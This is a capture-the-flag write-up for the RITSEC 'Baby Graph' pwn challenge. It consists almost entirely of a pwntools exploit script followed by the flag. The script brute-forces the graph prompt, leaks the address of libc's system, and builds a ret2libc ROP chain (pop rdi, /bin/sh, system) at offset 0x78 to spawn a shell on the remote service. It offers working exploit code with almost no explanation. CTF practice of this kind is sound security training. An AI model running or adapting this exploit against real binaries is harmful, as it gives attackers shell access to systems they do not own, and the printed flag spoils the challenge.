# Baby Graph

This is what happens to your baby when you want a pwner and a graph theorist. Do your part!!!

nc challenges1.ritsec.club 1339

Author: @fpasswd on Discord, @flyingpassword on Twitte

## Solution

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges1.ritsec.club --port 1339 babygraph
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('babygraph')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges1.ritsec.club'
port = int(args.PORT or 1339)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# IDK GRAPH THEORY LOL
while True:
    try:
        io = start()
        io.send("N N N N N ")
        io.recvuntil("prize: ")
        break
    except:
        io.close()
        pass

leak = io.recvline().decode()[:-1]
system = int(leak, 0)
libc.address = system - libc.sym["system"]
bin_sh = next(libc.search(b'/bin/sh'))

io.success("LIBC: {}".format(hex(libc.address)))
io.success("SYSTEM: {}".format(hex(system)))
io.success("BIN_SH: {}".format(hex(bin_sh)))

rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

io.success("POP_RDI: {}".format(hex(pop_rdi)))
io.success("RET: {}".format(hex(ret)))

payload = flat({
    0x78:[
        ret,
        pop_rdi,
        bin_sh,
        system,
        ],
    })

io.sendline(payload)

io.interactive()
```

## Flag

`RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}`

